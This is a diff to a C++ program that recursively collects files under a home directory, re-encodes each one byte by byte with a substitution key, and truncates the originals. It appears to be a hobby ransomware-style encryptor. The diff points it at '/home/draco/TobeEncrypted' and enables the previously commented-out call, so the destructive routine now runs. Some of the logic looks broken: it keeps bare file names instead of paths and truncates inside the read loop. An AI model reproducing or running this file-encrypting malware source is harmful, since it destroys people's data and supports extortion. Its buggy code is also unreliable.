@@ -6,13 +6,14 @@
 #include <map>
 #include <unordered_map>
 
-auto encryptor(std::string &path, std::map<char, int> &encryption, char &byte) -> void {
-    for (const auto &entry : std::filesystem::directory_iterator(path)) {
-        std::ifstream read(entry.path());
+auto encryptor(std::unordered_map<std::string, int>& files, std::map<char, int> &encryption, char &byte) -> void {
+    for (const auto &entry : files) {
+        std::ifstream read(entry.first);
 
-        if (!read.is_open()) std::cerr << "[-] Could not open the file - '" << path << "'" << std::endl;
-        else std::cout << "File opened" << std::endl;
-        auto encrypt = std::fstream(entry.path(), std::ios::out | std::ios::app);
+        if (!read.is_open()) std::cerr << "[-] Could not open the file - '" << entry.first << "'" << std::endl;
+        else std::cout << "[*] File opened" << std::endl;
+
+        auto encrypt = std::fstream(entry.first, std::ios::out | std::ios::app);
 
         while (read.get(byte)) {
             if (encryption.contains(byte)) {
@@ -23,26 +24,28 @@ auto encryptor(std::string &path, std::map<char, int> &encryption, char &byte) -
                 }
                 encrypt << '\n';
             }
+
             std::ofstream ofs;
-            ofs.open(entry.path(), std::ofstream::out | std::ofstream::trunc);
+            ofs.open(entry.first, std::ofstream::out | std::ofstream::trunc);
             ofs.close();
         }
-        std::cout << "[*] File encrypted successfully\n" << std::endl;
+        std::cout << "[*] File(s) encrypted successfully\n" << std::endl;
     }
 }
 
 auto main() -> int {
+    std::unordered_map<std::string, int> files;
 
-    std::unordered_map<std::string, int> directories;
-
-    for (std::filesystem::recursive_directory_iterator i("/home/"), end; i != end; ++i) {
+    for (std::filesystem::recursive_directory_iterator i("/home/draco/TobeEncrypted"), end; i != end; ++i) {
         if (!is_directory(i->path())) {
-            directories[i->path().filename()];
+            files[i->path().filename()];
         }
     }
 
-    for (auto &it : directories) {
-        it.second++;
+    int count = 0;
+    for (auto &it : files) {
+        count+=1;
+        it.second = count;
         std::cout << it.first << " - " << it.second << std::endl;
     }
 
@@ -62,5 +65,5 @@ auto main() -> int {
         encryption[combination] = key;
     }
 
-    //encryptor(path, encryption, byte);
+    encryptor(files, encryption, byte);
 }
